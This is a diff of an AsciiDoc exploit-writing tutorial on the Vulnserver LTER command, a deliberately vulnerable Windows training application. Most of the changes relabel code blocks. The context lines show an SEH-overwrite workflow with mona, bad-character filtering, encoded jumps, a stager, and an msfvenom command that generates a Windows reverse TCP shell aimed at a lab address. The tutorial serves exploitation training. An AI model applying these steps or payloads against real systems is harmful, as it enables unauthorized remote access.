@@ -5,7 +5,7 @@
 :tags: osce, vulnserver, training, exploit
 :image: cover.png
 :alt: Photo by Kevin Ku on Unsplash
-:description: This series of posts deal on hacking Vulnserver, a Vulnerable-by-Design application that can used to practice Windows explotation. We've been faced to mostly space restrictions. This post will show how to exploit the LTER command on where we will need to bypass bad chars restrictions.
+:description: This post will show how to exploit the Vulnserver LTER command on where we will need to bypass bad chars restrictions.
 :keywords: Bussiness, Information, Security, Protection, Hacking, Exploit, OSCE
 :author: Andres Roldan
 :writer: aroldan
@@ -54,7 +54,7 @@ to the right path of exploiting our target.
 
 We can create a new connection and see how `LTER` command works:
 
-[source,bash]
+[source,console]
 ----
 $ telnet 192.168.0.20 9999
 Trying 192.168.0.20...
@@ -108,7 +108,7 @@ OK, we need to figure out the offset by:
 
 Let's do that:
 
-[source,bash]
+[source,console]
 ----
 $ msf-pattern_create -l 4000
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac...
@@ -139,7 +139,7 @@ image::pattern1.gif[Pattern]
 The SEH handler was overwritten with `356F4534`. We can check the offset
 using `pattern_offset.rb`:
 
-[source,bash]
+[source,console]
 ----
 $ msf-pattern_offset -q 356F4534
 [*] Exact match at offset 3554
@@ -237,7 +237,7 @@ will be mangled by the application when we are injecting code.
 
 To do that, `mona` can help us again:
 
-[source,bash]
+[source,console]
 ----
 !mona bytearray
 ----
@@ -250,7 +250,7 @@ I've mention in other posts that it's a good idea to exclude null chars
 (`0x00`), carriage return (`0x0d`) and line feed (`0x0a`) from our shellcode.
 We can filter them in advance with:
 
-[source,bash]
+[source,console]
 ----
 !mona bytearray -cpb '\x00\x0a\x0d'
 ----
@@ -306,7 +306,7 @@ injected.
 
 There is a more graphical way to check that, using `mona` once again:
 
-[source,bash]
+[source,console]
 ----
 !mona cmp -f C:\mona\vulnserver\bytearray.bin -a <badchars memory address>
 ----
@@ -320,7 +320,7 @@ image::badchars-start.png[Bad chars start]
 
 So the `mona` command would be:
 
-[source,bash]
+[source,console]
 ----
 !mona cmp -f C:\mona\vulnserver\bytearray.bin -a 00F0F1EE
 ----
@@ -402,7 +402,7 @@ a pointer that contains only bytes allowed on our character set. To do that,
 we can issue another command filtering the `POP/POP/RET`
 gadgets containing only ASCII bytes and excluding `0xa` and `0xd`:
 
-[source,bash]
+[source,console]
 ----
 !mona seh -cm safeseh=off -cp nonull,ascii -o -cpb '\x0a\x0d'
 ----
@@ -555,7 +555,7 @@ not viable:
 Maybe the long jump instruction is too large. Let's try with the farest
 backward short jump possible `JMP SHORT +0x80 = \xeb\x80`:
 
-[source,bash]
+[source,console]
 ----
 $ python -c "buff= b'\xeb\x80'; fd = open('jmp.bin', 'wb'); fd.write(buff)"
 $ cat jmp.bin | msfvenom -p - -a x86 --platform windows -e x86/opt_sub -o /dev/null
@@ -827,7 +827,7 @@ It was created by Elias Augusto and I added some convenient improvements.
 
 Let's get our encoded jump:
 
-[source,bash]
+[source,console]
 ----
 $ python3 encoder.py -m -p -s 'E92DF2FFFF' -v LONG_JUMP
 ...
@@ -932,7 +932,7 @@ jnz socket_loop         ; If recv() failed, jump back to the socket loop where
 
 We can compile that using `NASM`:
 
-[source,bash]
+[source,console]
 ----
 $ nasm -f elf32 -o shellcode.o shellcode.asm
 ----
@@ -948,7 +948,7 @@ $ for i in $(objdump -d shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\
 
 Now, let's encode that with our tool:
 
-[source,bash]
+[source,console]
 ----
 $ python3 ~/Automatic-ASCII-Shellcode-Subtraction-Encoder/encoder.py -m -p -s
 '\x83\xec\x02\x31\xff\x31\xdb\x53\x80\xc7\x04\x53\x89\xe3\x83\xc3\x64\x53\x47
@@ -1073,7 +1073,7 @@ Weeeh! Now to finish, we can create our shellcode and insert it on our side
 channel created by the stager. As we now control the `recv()` call, we are not
 limited by the bad chars now! Let's do that:
 
-[source,bash]
+[source,console]
 ----
 $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=4444 EXITFUNC=none -f python -v SHELL
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
